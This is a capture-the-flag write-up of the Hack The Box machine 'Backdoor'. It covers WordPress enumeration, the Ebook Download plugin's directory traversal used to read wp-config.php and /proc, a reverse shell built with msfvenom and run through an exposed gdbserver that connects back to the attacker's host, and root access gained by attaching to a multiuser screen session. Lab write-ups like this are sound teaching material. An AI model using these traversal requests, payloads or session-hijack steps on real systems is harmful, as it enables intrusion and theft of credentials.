![Backdoor](https://0xdfimages.gitlab.io/img/backdoor-cover.png)

Backdoor starts by finding a WordPress plugin with a directory traversal bug that allows me to read files from the filesystem. I‚Äôll use that to read within the /proc directory and identify a previously unknown listening port as gdbserver, which I‚Äôll then exploit to get a shell. To get to root, I‚Äôll join a screen session running as root in multiuser mode.

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and something unknown on 1337:

```

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### TCP 1337

The `nmap` scan and scripts were not able to get anything out of port 1337. I‚Äôll try a couple manual checks, like connecting with `nc` and sending random text, and `curl`, but nothing ever comes back.

```

oxdf@hacky$ nc -v 10.10.11.125 1337
Connection to 10.10.11.125 1337 port [tcp/*] succeeded!
hello
test
^C
oxdf@hacky$ curl 10.10.11.125:1337
^C

```

I‚Äôll have to come back to this later.

### Website - TCP 80

#### Site

The site is for an art muesum but is mostly just a default HTML template:

[![image-20220420130147369](https://0xdfimages.gitlab.io/img/image-20220420130147369.png)](https://0xdfimages.gitlab.io/img/image-20220420130147369.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220420130147369.png)

The ‚ÄúAbout‚Äù and ‚ÄúContact‚Äù links lead to other static pages with default template text. The ‚ÄúBlog‚Äù link as well, and there‚Äôs one post by admin. The ‚ÄúHome‚Äù link points to `backdoor.htb`, so I‚Äôll add that to `/etc/hosts` and scan for sub domains with `wfuzz`, but not find any.

#### Tech Stack

The bottom of the page does say ‚ÄúProudly powered by WordPress‚Äù. There‚Äôs not much interesting to report from the headers or looking at any source.

WordPress is written in PHP, though trying `index.php` actually leads to redirects. This makes sense, as WordPress does manage URL routes differently than a static site with PHP pages.

#### wpscan

I‚Äôll run `wpscan` on the host. The scan I typically run finished in about a minute, and doesn‚Äôt find much:

```

oxdf@hacky$ wpscan -e ap,t,tt,u --url http://backdoor.htb --api-token $WPSCAN_API

That‚Äôs worth keeping in mind if I want to try to brute force creds for an account or have access to an account without GUI access.

There‚Äôs several CVEs in the WordPress code that are called out. A bunch aren‚Äôt interesting (expired root cert, prototype pollution, even stored XSS (at least not at this point)). There‚Äôs two SQL injections (CVE-2022-21661 and CVE-2022-21664), but I couldn‚Äôt find good detail on either.

It doesn‚Äôt find any plugins:

And nothing else is interesting.

It‚Äôs worth starting in the background a more aggressive scan to try to brute force plugins, which I‚Äôll do with `--plugins-detection aggressive`. This takes half an hour to complete, but finds two plug-ins::

```

The directory traversal in Ebook Download is particularly interesting.

#### Alternative Plugins Brute

If I didn‚Äôt want to use `wpscan` to enumerate WordPress plugins, I could also try a wordlist like [this one](https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/master/plugins.txt) with `feroxbuster`:

```

oxdf@hacky$ feroxbuster -u http://backdoor.htb/wp-content/plugins -w plugins.txt

```

It finds the same two plugins, which I could then research and find exploits for.

#### Alternative Plugins Discovery

After finding the plugins as described above, someone pointed out to me that the `/wp-content/plugins/` directory on Backdoor has directory listing enabled. That is not the default case, and WordPress typically puts an empty `index.php` in this directory to prevent just this kind of data leak. But it is the case here, which means that no brute force is necessary:

![image-20220421134550682](https://0xdfimages.gitlab.io/img/image-20220421134550682.png)

This is plenty to identify the Ebook Download plugin, and clicking on the folder shows the contents including the `readme.txt` with the version as well as the rest of the plugin files.

## Shell as user

### Local File Read

#### Background

The links from `wpscan` don‚Äôt give a POC, but a quick Google search for Ebooks-Download directory traversal finds [this exploit-db](https://www.exploit-db.com/exploits/39575) post. It shows that the version can be disclosed with `http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt` (which is what‚Äôs referenced in the `wpscan` results), and that the POC is to visit `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`.

Just looking at the POC, it looks like the `ebookdownloadurl` accepts a local path which probably wasn‚Äôt what the author intended.

#### POC

I‚Äôll manually check the version just to verify:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
=== Plugin Name ===                               
Contributors: zedna                                                 
Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=3ZVGZTC7ZPCH2&lc=CZ&item_name=Zedna%20Brickick%20Website&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
Tags: ebook, file, download                                         
Requires at least: 3.0.4         
Tested up to: 4.4                             
Stable tag: 1.1 
...[snip]...

```

The ‚ÄúStable tag‚Äù of 1.1 shows a vulnerable version.

I‚Äôm able to read the `wp-config.php` file just like the POC suggests, including the database connection information:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
/**
 * The base configuration for WordPress
...[snip]...
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
...[snip]...

```

I can try to log into WordPress at`http://backdoor.htb/wp-login.php` with the username admin and wordpressuser, but neither work.

#### Filesystem Enumeration

The challenge with directory traversal / file read vulns is that you typically can‚Äôt list directories, only access files I know to exist.

`/etc/passwd` will provide a list of users:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd
../../../../../../../etc/passwd../../../../../../../etc/passwd../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>

```

I can try the DB password with user and root over SSH, but it doesn‚Äôt work.

Apache configs is something I can try to grab. `/etc/apache2/sites-enabled/000-default.conf` doesn‚Äôt returns anything, but `backdoor.htb.conf` does (comments removed):

```

<VirtualHost *:80>

        ServerName backdoor.htb
        ServerAlias *
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

<script>window.close()</script>

```

Still, nothing interesting.

### Process Enumeration

#### Strategy

Especially in light of the unknown service running on 1337, I‚Äôd like to get a list of the processes running on the system. I can take a look at `/proc`, which has a directory for each process id (pid) currently running. For example, on my VM:

```

oxdf@hacky$ ls /proc/
1     109   12    130   1756  1820  1957  2070  2149  2194  224   2286  2431   28422  36    41     441  520    70500  766    786    79395  800    83982  913  97          cpuinfo        fs          kpagecgroup  mtrr          stat           version_signature

```

There‚Äôs also the `self` folder, which is a symbolic link to the pid of the current process. Again, from my VM:

```

oxdf@hacky$ ls -l /proc/self
lrwxrwxrwx 1 root root 0 Apr 18 21:38 /proc/self -> 85664

```

In each numbered folder, the `cmdline` file has the command line user to run the process:

```

oxdf@hacky$ cat /proc/self/cmdline
cat/proc/self/cmdline

```

It‚Äôs worth noting that there‚Äôs no space between `cat` and the path. `xxd` make this clear:

```

oxdf@hacky$ cat /proc/self/cmdline | xxd
00000000: 6361 7400 2f70 726f 632f 7365 6c66 2f63  cat./proc/self/c
00000010: 6d64 6c69 6e65 00                        mdline.

```

The program and the arguments are actually separated by a null byte. I‚Äôll keep that in mind.

#### POC on Backdoor

On Backdoor, I can do the same thing:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

```

`curl` is not happy about putting binary data to the command line. I‚Äôll force it with `-o-`, and use `xxd` to look at the results:

```

oxdf@hacky$ curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- | xxd
00000000: 2e2e 2f2e 2e2f 2e2e 2f2e 2e2f 2e2e 2f2e  ../../../../../.

000000a0: 6528 293c 2f73 6372 6970 743e            e()</script>

```

It seems to print the given parameter three times, then without a break the results, which includes `\x00` where I would want spaces. Then it ends in `<script>window.close()</script>`.

I can use `tr` to [replace the nulls with whitespace](https://stackoverflow.com/a/42592972), and `cut` to remove the beginning and end:

```

oxdf@hacky$ curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr '\000' ' ' | cut -c115- | rev | cut -c32- | rev
/usr/sbin/apache2 -k start

```

The breaks down as:
- `tr '\000' ' '` - replace nulls with spaces
- `cut -c115-` start at character 115 and print the rest. I‚Äôll note that 115 is three times the length of the parameter plus 1.
- `rev | cut -c32- | rev` - reverse the string, start 32 characters in, and then reverse again, effectively removing the last 31 characters.

This traversal also works with absolute paths, so `ebookdownloadurl=/proc/self/cmdline`.

#### Bash Script

I can make a quick Bash script from this to loop over a range of pids and try to find processes:

```

#!/bin/bash

for i in $(seq 1 50000); do

    path="/proc/${i}/cmdline"
    skip_start=$(( 3 * ${#path} + 1))
    skip_end=32

    res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path}ne -o- | tr '\000' ' ')
    output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
    if [[ -n "$output" ]]; then
        echo "${i}: ${output}"
    fi

done

```

This effectively does what I showed above, capturing the results with nulls replaced in `res`, then cutting the start and end and saving as `output`, and finally printing the pid and the command line if it‚Äôs there.

This is a bit slow, but good enough to do the job. I hope to come back and do a post and/or video on parallelizing this in the future.

The script clears the first 1000 processes in a minute or so, which is enough to spot PID 851:

```

oxdf@hacky$ ./brute_processes.sh  
1: /sbin/init auto automatic-ubiquity noprompt

887: /usr/sbin/apache2 -k start 
898: /usr/lib/accountsservice/accounts-daemon 
...[snip]...

```

This process is:

```

/bin/sh -c while true;
    do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; 
done

```

It‚Äôs running `gdbserve` as user in a loop on port 1337.

### Exploit gdbserver

#### Upload Rev Shell Elf

Hacktricks has a [page](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) on exploiting `gdbserver`. I suspect at least the first technique was tested on Backdoor (given the use of port 1337 and the location of `/home/user`). This technique is to create an elf, and then upload it to the remote debugger and run it there.

I‚Äôll create a simple reverse shell payload with `msfvenom`:

```

oxdf@hacky$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: rev.elf

```

Next, I‚Äôll start debugging it locally:

```

oxdf@hacky$ gdb -q rev.elf 
Reading symbols from rev.elf...
(No debugging symbols found in rev.elf)
(gdb)

```

Now connect to the remote server:

```

(gdb) target extended-remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...

0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2

```

With that connection, I can upload the binary:

```

(gdb) remote put rev.elf /dev/shm/rev
Successfully sent file "rev.elf".

```

Now I just need to set the remote debugging target to that file, and run it:

```

(gdb) set remote exec-file /dev/shm/rev
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /dev/shm/rev from remote target...
Reading /dev/shm/rev from remote target...
Reading symbols from target:/dev/shm/rev...
(No debugging symbols found in target:/dev/shm/rev)
[Detaching after fork from child process 33603]
[Inferior 1 (process 33592) exited normally]

```

When that finishes, there‚Äôs a connection at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.125 46586
id
uid=1000(user) gid=1000(user) groups=1000(user)

```

I‚Äôll do a shell upgrade with `script`:

```

script /dev/null -c bash
Script started, file is /dev/null
user@Backdoor:/home/user$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
user@Backdoor:/home/user$

```

I‚Äôm told that there may be issues running `gdb` with a different version than the server. I didn‚Äôt have any issues, but in this case my VM and the target are both Ubuntu 20.04. If you have issues from Kali or Parrot, that may be the problem.

I can also grab `user.txt`:

```

user@Backdoor:/home/user$ cat user.txt
0d183e76************************

```

#### With MSF

The simpler way to exploit this is using Metasploit. I‚Äôll start `msfconsole`, and find the exploit:

```

oxdf@hacky$ msfconsole 
...[snip]...
msf6 > search gdb

I‚Äôll configure it by setting the `rhosts`, `rport`, and `lhost`:

```

msf6 exploit(multi/gdb/gdb_server_exec) > options

## Shell as root

### Enumeration

Looking through the processes earlier, another one jumps out. From a shell, it‚Äôs easier to see:

```

user@Backdoor:/home/user$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root         853  0.0  0.0   2608  1828 ?        Ss   16:43   0:05 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
...[snip]...

```

Something is running `screen` as root (in a loop) as root:

```

/bin/sh -c while true;
    do sleep 1;
    find /var/run/screen/S-root/ -empty -exec screen -dmS root \;
done

```

I suspect the loop is to make this exploitable for HTB, idea is to similar as if the admin is logged in with a screen session.

### Screen

#### Background

`screen` is a terminal multiplexer, which allows a user to open multiple windows from within a session and keep those windows running even when the user isn‚Äôt around or connected (they will go away at reboot).

#### Screen Configuration

In general, it‚Äôs not possible to log into other user‚Äôs screen sessions. However, there are configurations that allow that, and that happens to be what I‚Äôll exploit here.

I would typically look at this in Beyond Root, but too many people are going to look at Backdoor and assume it‚Äôs typical to just own `screen` by hoping into another user‚Äôs session. That is not a default case, as it has to be configured a very specific way.

First, let‚Äôs look at how `screen` is being `invoked`. There‚Äôs a cron running `find /var/run/screen/S-root/ -empty -exec screen -dmS root ;\`. When a session is created, `screen` creates a folder in `/var/run/screen/S-[username]/[sesison id].[session name]`. The `-empty` flag tells `find` to only return empty directories or files. So it will only return something if that `S-root` folder is empty, which means there is no session. If that is the case (there‚Äôs no `screen` session in `S-root`), it will run `screen` to start one.

It runs `screen` with three args, and the [man page](https://linux.die.net/man/1/screen) shows:
- `-D -m` (which also covers `-dm`) - starts screen in ‚Äúdetached mode‚Äù, and doesn‚Äôt fork a new process. If the session ends, it exits as well.
- `-S root` - names the session, in this case, ‚Äúroot‚Äù

This on it‚Äôs own is not enough for another user to try to connect to the session. [This StackExchange answer](https://unix.stackexchange.com/a/163878/369627) talks about how to set up `screen` in multiuser mode. Once inside the session, the user needs to `multiuser on` and add the user that can connect to an access control list. As root, I can see this is done in `/root/.screenrc` (which runs each time `screen` starts):

```

multiuser on                                                                    
acladd user                                                                     
shell -/bin/bash

```

It also notes in that post that `screen` must be SUID for this to work. It isn‚Äôt on my Ubuntu 20.04 machine by default, but I understand that some distros do ship with it that way (I remember seeing it as a SUID binary on a certain 24-hour exam I took in 2018).

Because `screen` is configured exactly this way, I can exploit it as follows.

#### Screen Sessions

Running `screen -ls` will show sessions for the current user:

```

user@Backdoor:/home/user$ screen -ls
No Sockets found in /run/screen/S-user.

```

The process is running as root, so I‚Äôll try to tell `screen` to look in `S-root`. Adding `root/` to the end of the command works:

```

user@Backdoor:/home/user$ screen -ls S-root/
Cannot identify account 'S-root'.
user@Backdoor:/home/user$ screen -ls root/
There is a suitable screen on:
        947.root        (04/20/22 16:43:20)     (Multi, detached)
1 Socket in /run/screen/S-root.

```

Interestingly, it does require the trailing `/`.

#### Connect to screen Session

I‚Äôll connect to that session using `-x` and the `[user]/[session id]`:

```

user@Backdoor:/home/user$ screen -x root/37344              
Please set a terminal type.

```

It complains about a missing terminal type. That‚Äôs typically set in an environment variable. I‚Äôll add that to the front of the command, and on running `TERM=screen screen -x root/37344`, I‚Äôm dropped into a `screen` session as root:

```

root@Backdoor:~#                                                                

```

It also works using the `[user]/[session name]`, so in this case, `TERM=screen screen -x root/root`.

I can read `root.txt`:

```

root@Backdoor:~# cat root.txt
